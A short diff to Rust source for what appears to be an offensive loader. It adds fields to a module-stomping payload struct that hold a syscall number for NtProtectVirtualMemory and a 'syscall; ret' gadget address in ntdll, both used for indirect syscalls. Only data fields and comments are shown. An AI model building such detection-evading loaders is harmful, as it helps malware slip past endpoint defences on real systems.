@@ -13,6 +13,11 @@ pub struct StompPayload {
     /// SizeOfImage of the selected victim DLL read from its GAC_MSIL disk path.
     /// usize::MAX = GAC read failed; upper-bound check in AcquiredVAS disabled.
     pub victim_image_size: usize,
+    /// NtProtectVirtualMemory syscall service number (SSN). 0 = not resolved
+    /// (mm_acquired_vas falls back to userland VirtualProtect via PEB walk).
+    pub nt_vp_ssn: u32,
+    /// Address of `syscall; ret` gadget inside ntdll. 0 = not resolved.
+    pub nt_vp_gadget: usize,
     /// Set to 1 before Load_2; cleared to 0 after Load_2 returns regardless of result.
     pub pending: i32,
     /// Set to 1 in AcquiredVirtualAddressSpace on successful stomp.
